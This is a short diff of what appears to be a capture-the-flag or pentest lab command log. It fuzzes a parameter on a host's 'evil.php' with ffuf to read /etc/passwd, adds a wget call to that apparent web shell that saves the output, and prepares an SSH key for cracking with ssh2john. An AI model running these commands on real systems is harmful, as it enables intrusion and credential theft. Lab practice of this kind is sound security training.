@@ -1,4 +1,5 @@
 ffuf -u 'http://10.0.0.192/secret/evil.php?FUZZ=/etc/passwd' -w wordlists/directory-list-2.3-small.txt -fs 0
+wget http://10.0.0.192/secret/evil.php?command=/etc/passwd >> key
 cd /usr/share/john
 ./ssh2john.py key
 which openssl
